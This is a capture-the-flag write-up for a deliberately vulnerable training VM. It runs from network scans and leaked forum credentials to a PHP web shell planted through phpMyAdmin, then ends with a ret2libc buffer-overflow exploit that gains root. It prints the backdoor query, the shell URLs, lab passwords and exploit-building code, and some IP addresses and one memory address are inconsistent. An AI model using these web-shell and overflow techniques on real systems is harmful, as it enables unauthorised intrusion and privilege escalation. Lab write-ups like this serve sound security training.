# Method 1

## FIND VMs ID

Let's configure 'virtual host adapter (192.168.56.1/24)' network to our VM and find it's IP.

```bash
MacBook-Pro-admin:~ avdementev$ nmap 192.168.56.1-255
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-09 00:09 MSK
Nmap scan report for 192.168.56.1
Host is up (0.00010s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
111/tcp  open  rpcbind
999/tcp  open  garcon
1021/tcp open  exp1
1023/tcp open  netvenuechat
2049/tcp open  nfs

Nmap scan report for 192.168.56.100
Host is up (0.00038s latency).
All 1000 scanned ports on 192.168.56.100 are closed

Nmap scan report for 192.168.56.101
Host is up (0.00068s latency).
Not shown: 994 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 255 IP addresses (3 hosts up) scanned in 81.90 seconds
```

The result IP will be like 192.168.56.x (In this case - 192.168.56.100)

## Scan 80 and 443
Let's open http://192.168.56.100
(TODO: add 1.png)

We will use penteesting tools like Burp Suite or dirb.
```bash
┌──(dubr㉿kali)-[~]
└─$ dirb http://192.168.56.106 -r                                                    255 ⨯
 
-----------------
DIRB v2.22
By The Dark Raver
-----------------
 
START_TIME: Sat Jan  9 15:59:16 2021
URL_BASE: http://192.168.56.106/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive
 
-----------------
 
GENERATED WORDS: 4612
 
---- Scanning URL: http://192.168.56.106/ ----
+ http://192.168.56.106/cgi-bin/ (CODE:403|SIZE:290)
==> DIRECTORY: http://192.168.56.106/fonts/
+ http://192.168.56.106/forum (CODE:403|SIZE:287)
+ http://192.168.56.106/index.html (CODE:200|SIZE:1025)
+ http://192.168.56.106/server-status (CODE:403|SIZE:295)
 
-----------------
END_TIME: Sat Jan  9 15:59:18 2021
DOWNLOADED: 4612 - FOUND: 4
 
 
 
┌──(dubr㉿kali)-[~]
└─$ dirb https://192.168.56.106 -r                                                   130 ⨯
 
-----------------
DIRB v2.22
By The Dark Raver
-----------------
 
START_TIME: Sat Jan  9 16:00:01 2021
URL_BASE: https://192.168.56.106/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive
 
-----------------
 
GENERATED WORDS: 4612
 
---- Scanning URL: https://192.168.56.106/ ----
+ https://192.168.56.106/cgi-bin/ (CODE:403|SIZE:291)
==> DIRECTORY: https://192.168.56.106/forum/
==> DIRECTORY: https://192.168.56.106/phpmyadmin/
+ https://192.168.56.106/server-status (CODE:403|SIZE:296)
==> DIRECTORY: https://192.168.56.106/webmail/
 
-----------------
END_TIME: Sat Jan  9 16:00:03 2021
DOWNLOADED: 4612 - FOUND: 2
```

## FORUM - Probleme login ?

```
....
....
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
```
!q\]Ej?*5K5cy*AJ - PASSWORD???
After some tries we got password for lmezards forum account
```
lmezard:!q\]Ej?*5K5cy*AJ
```
(TODO: add 2.png)

Lmezards mail is laurie@borntosec.net
Let's try to access to 192.168.56.x/forum with the same password

```
laurie@borntosec.net:!q\]Ej?*5K5cy*AJ
```

There is the message DB Access:

```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

Now we can to access 192.168.56.x/phpmyadmin
(TODO: add 4.png)

## Reverse Shell

The basic reverse shell injection looks litke this

```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/backdoor.php"
```
It does not work becouse permission denied.

But it works:
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile '/var/www/forum/templates_c/backdoor.php'
```

Now we can use this php like shell.

https://192.168.56.101/forum/templates_c/backdoor.php?cmd=ls%20/home
```
LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz
```

https://192.168.56.101/forum/templates_c/backdoor.php?cmd=ls%20/home/LOOKATAME
```
password
```

https://192.168.56.101/forum/templates_c/backdoor.php?cmd=cat%20/home/LOOKATME/password
```
lmezard:G!@M6f4Eatau{sF"
```

And now we can to pass this data to ssh or ftp.
FTP is ok.
(TODO: add 5.png)

## Sort files (Lmezerd)

There are two files fun and README.md
```
MacBook-Pro-admin:lmezard avdementev$ cat README 
Complete this little challenge and use the result as password for user 'laurie' to login in ssh

MacBook-Pro-admin:lmezard avdementev$ file fun
fun: POSIX tar archive (GNU)
MacBook-Pro-admin:lmezard avdementev$ tar xvf fun
x ft_fun/
x ft_fun/C4D03.pcap
x ft_fun/GKGEP.pcap
..
x ft_fun/Y8S1M.pcap
MacBook-Pro-admin:lmezard avdementev$ ls -l ft_fun/ | wc -l
     751
MacBook-Pro-admin:lmezard avdementev$ 
```

There are 751 file with pieces of code... The solve program in lmezard folder.

We got password:
```
Iheartpwnage
sha256(Iheartpwnage) = 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

Let's connect to SSH:
```
laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

## Reverse program (laurie)

```
laurie@192.168.56.101's password:
laurie@BornToSecHackMe:~$ ls
bomb  README
laurie@BornToSecHackMe:~$ cat README
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```

Lets download bomb file and open it in IDA.

```
MacBook-Pro-admin:Boot2root avdementev$ scp laurie@192.168.56.101:/home/laurie/bomb ./laurie
        ____                _______    _____           
       |  _ \              |__   __|  / ____|          
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@192.168.56.101's password: 
bomb                                                                                                                                  100%   26KB  18.4MB/s   00:00  
```

### Phase1

![phase1](https://github.com/demsasha4yt/Boot2root/blob/master/laurie/phase_1.png)

### Phase2
![phase2](https://github.com/demsasha4yt/Boot2root/blob/master/laurie/phase_2.png)

### Phase3
![phase3](https://github.com/demsasha4yt/Boot2root/blob/master/laurie/phase_3.png)

### Phase4
![phase4](https://github.com/demsasha4yt/Boot2root/blob/master/laurie/phase_4.png)

### Phase5
![phase5](https://github.com/demsasha4yt/Boot2root/blob/master/laurie/phase_5.png)

### Phase6
![phase6_1](https://github.com/demsasha4yt/Boot2root/blob/master/laurie/phase_6_1.png)
![phase5](https://github.com/demsasha4yt/Boot2root/blob/master/laurie/phase_6_2.png)

## Turtle (Thor)

The basic list of turtles step
We'll use turtlejs to draw its way.
The password is SLASH

```bash
MBP-admin:Boot2root avdementev$ echo -n SLASH | md5
646da671ca01bb5d84dbb5fb2238dc8e
```

The result password is 646da671ca01bb5d84dbb5fb2238dc8e


### explot_me (Zaz)

We will use the ret2libc exploit to use root. All we net to do is SYSSEGV and use system("/bin/sh")

```bash
__libc_start_main(0x80483f4, 2, 0xbffff7c4, 0x8048440, 0x80484b0 <unfinished ...>
strcpy(0xbffff6a0, "sdafsdaf")                                    = 0xbffff6a0
puts("sdafsdaf"sdafsdaf
)                                                  = 9
+++ exited (status 0) +++
```

The programs prints first argument on screen using strcpy...

If we pass the string with length bigger then 140 the program will be crash with SYSSEGV
```
zaz@BornToSecHackMe:~$ echo $(python -c 'print "A"*140') > pattern
zaz@BornToSecHackMe:~$ ltrace ./exploit_me $(cat pattern)BB
__libc_start_main(0x80483f4, 2, 0xbffff744, 0x8048440, 0x80484b0 <unfinished ...>
strcpy(0xbffff620, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                        = 0xbffff620
puts("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABB
)                                                      = 143
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

Then we need to find address of system, /bin/sh/, exit...

```bash
zaz@BornToSecHackMe:~$ gdb ./exploit_me
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
(gdb) start
Temporary breakpoint 1 at 0x80483f7
Starting program: /home/zaz/exploit_me

Temporary breakpoint 1, 0x080483f7 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

System address is 0x080483f7

```bash
(gdb) find '/bin/sh'
No symbol table is loaded.  Use the "file" command.
(gdb) info proc map
process 2953
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
	 0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
	0xb7e2b000 0xb7e2c000     0x1000        0x0
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0
	0xb7fdb000 0xb7fdd000     0x2000        0x0
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) find 0xb7e2c000,0xb7fcf000,"/bin/sh"
0xb7f8cc58
1 pattern found.
```

The /bin/sh address is 0xb7f8cc58

```bash
(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0xb7e5ebe0  exit
0xb7e5ec10  on_exit
0xb7e5ee20  __cxa_atexit
0xb7e5efc0  quick_exit
0xb7e5eff0  __cxa_at_quick_exit
0xb7ee41d8  _exit
0xb7f28500  pthread_exit
0xb7f2dc10  __cyg_profile_func_exit
0xb7f4c750  svc_exit
0xb7f56c80  atexit
```
exit address is 0xb7e5ebe0


The resul exploit string will be look this JUNK(140 bytes) + system in little endian + 4 bytes + /bin/sh (little endian)
```python
buf = ''
buf += 'A'*140 # junk
buf += '\x60\xb0\xe6\xb7' # system 0xb7e6b060
buf += "llll" # 4 bytes
buf += '\x58\xcc\xf8\xb7' # /bin/sh 0xb7f8cc58

f = open("exploit.txt", "w")
f.write(buf)
f.close
```

```
zaz@BornToSecHackMe:~$ ./exploit_me $(python exploit.py)
zaz@BornToSecHackMe:~$ ./exploit_me $(python exploit.py)
zaz@BornToSecHackMe:~$ ./exploit_me $(cat exploit.
exploit.py   exploit.txt
zaz@BornToSecHackMe:~$ ./exploit_me $(cat exploit.txt)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��llllX��
# whoami
root
```
# Done
